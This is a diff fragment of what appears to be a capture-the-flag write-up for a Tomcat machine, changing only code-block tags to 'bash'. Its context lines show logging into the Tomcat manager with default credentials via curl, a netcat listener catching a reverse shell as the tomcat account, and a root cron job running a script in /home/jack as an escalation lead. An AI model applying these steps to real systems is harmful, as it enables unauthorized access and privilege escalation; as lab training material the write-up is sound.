@@ -48,7 +48,7 @@ curl http://10.82.152.247:8080/manager/html -u tomcat:s3cret >> manager.txt
 
 That worked - full access to the Tomcat Web Application Manager. Browsing through the application list, one path stood out immediately:
 
-```
+```bash
 /hgkFDt6wiHIUB29WWEON5PA
 ```
 
@@ -76,7 +76,7 @@ nc -lvnp 4444
 
 Navigated to the deployed webapp path, and caught a shell back as the `tomcat` service account:
 
-```
+```bash
 uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
 ```
 
@@ -100,7 +100,7 @@ Most SUID binaries are owned by root, so if any of them are exploitable (known v
 
 But nothing interesting in SUID binaries. However, `/etc/crontab` had something immediately useful:
 
-```
+```bash
 *  *  *  *  *   root    cd /home/jack && bash id.sh
 ```
 
